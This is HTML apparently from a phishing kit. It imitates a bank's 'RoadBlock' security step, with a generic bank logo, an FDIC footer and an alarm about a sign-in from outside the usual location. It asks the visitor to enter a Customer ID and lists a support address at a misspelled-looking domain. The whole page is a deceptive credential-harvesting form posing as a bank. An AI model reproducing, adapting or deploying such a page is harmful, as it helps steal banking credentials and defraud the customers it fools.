...
<HEAD>
		...
		<title id="HTMLTITLE">RoadBlock: Customer ID Required</title>
				...
				<div class="pageHeader">
					...
					<table width="100%" border="0" cellspacing="0" cellpadding="0">
						...
						<tr>
							...
							<td valign="top" align="left"><p><a href="index.php"><img name="logo" src="logo.png" width="" height="" alt="[ Bank]"></a></p>
						    <p>&nbsp;</p></td>
							...
							<td align="right" valign="middle">
								...
								<div class="secondaryNav">
									...
									<a id="LNKHELP" href="#" target="_blank">Help</a>

									

									<a id="LNKCONTACTUS" href="#" target="_blank">Contact Us</a>
			...
			<tr>
				...
				<td>
					...
					<P>
						...
						<div class="instructions">Please enter your Customer ID sent to your email  for your protection as our system has detected that you are currently trying to sign in from <span class="outside">outside your usual location.</span></div></P>

					<P>

						<div class="instructions" nowrap>If you need additional assistance, please contact  customer support : customercare@enizbnkas.com</div></P>
					...
					<DIV class="formContainer">
							...
							<TABLE class="formTable">
								...
								<TR class="item">
									...
									<TD width="189">
										...
										<input name="cust_id" type="text" maxlength="20" id="ctlWorkflow_txtUserID" class="asd_input" />
									...
									<TD width="258">
										...
										(This must be issued by the bank)</TD>
						...
						<DIV class="formButtonContainer">
							...
							<input language="javascript" onclick="__doPostBack('ctlWorkflow$btnStep1Cancel','')" name="CANCEL" id="ctlWorkflow_btnStep1Cancel" type="reset" class="inputButton cancel" value="CANCEL" />

							<input type="submit" name="submit" value="SUBMIT" class="inputButton submit" />
			...
			<div margin-left="100px" class="footerContainer">
				...
				<table cellspacing="2" cellpadding="1px" align="left"  border="0" width="100%" style="border-bottom: 3px solid #c1bead;border-top: 3px solid #c1bead;">
					...
					<tr>
						...
						<td align="left" style="margin-top: 0px; padding-right: 5px; padding-left:10px; border-left: #999999 1px dotted;border-right: #999999 1px dotted;">&nbsp;</td>

						<td align="center" width="250" style="border-right: #999999 1px dotted;font-family :Arial;font-size:11px; text-decoration: none;color: #999;font-weight:bold;">

							Copyright© 2005-2018  Member FDIC. Equal Housing Lender <img src='gif/logo_ehl.gif' width="17" height="13" border="0" />
